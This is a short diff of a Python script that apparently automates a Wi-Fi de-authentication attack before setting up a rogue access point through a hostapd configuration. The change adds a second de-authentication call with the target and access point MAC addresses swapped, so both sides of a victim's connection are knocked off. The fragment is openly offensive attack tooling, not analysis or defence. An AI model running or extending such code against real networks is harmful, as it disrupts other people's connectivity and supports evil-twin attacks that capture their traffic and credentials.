@@ -44,6 +44,8 @@ target_mac = input("Choose target: ")
 # Starting de-authentication attack
 call(["sudo", "gnome-terminal", "--", "python3", "deauth.py", ap_mac, target_mac])
 sleep(2)
+call(["sudo", "gnome-terminal", "--", "python3", "deauth.py", target_mac, ap_mac])
+sleep(2)
 
 # Setting up the ap configurations
 f = open("hostapd.conf", "w")
